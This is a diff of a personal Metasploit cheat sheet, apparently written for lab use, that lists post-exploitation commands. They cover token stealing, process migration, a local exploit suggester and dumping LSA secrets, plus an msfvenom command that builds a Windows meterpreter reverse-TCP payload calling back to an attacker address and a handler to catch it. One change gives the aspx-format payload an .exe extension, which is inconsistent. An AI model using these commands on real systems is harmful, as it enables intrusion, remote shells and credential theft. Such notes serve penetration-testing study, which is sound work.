@@ -333,6 +333,7 @@ jobs -l #list all jobs
 - further read https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/
 
 ### Workflow
+
 ```shell
 
 db_nmap -O -A 10.129.118.172
@@ -349,6 +350,7 @@ run
 getuid #get the user id
 ps #list all processes
 steal_token 1836 #steal the token from the process
+migrate 2136 #migrate to other process
 getuid #get the user id now from the process
 bg #background the session
 search local_exploit_suggester #search for exploits based on session
@@ -367,7 +369,7 @@ lsa_dump_secrets #dump the secrets
 ## MSFVENOM
 with multihandler we can handle a reverse shell from msfvenom also meterpreter
 ```shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.exe
 msfconsole -q 
 msf6 > use multi/handler
 msf6 exploit(multi/handler) > show options
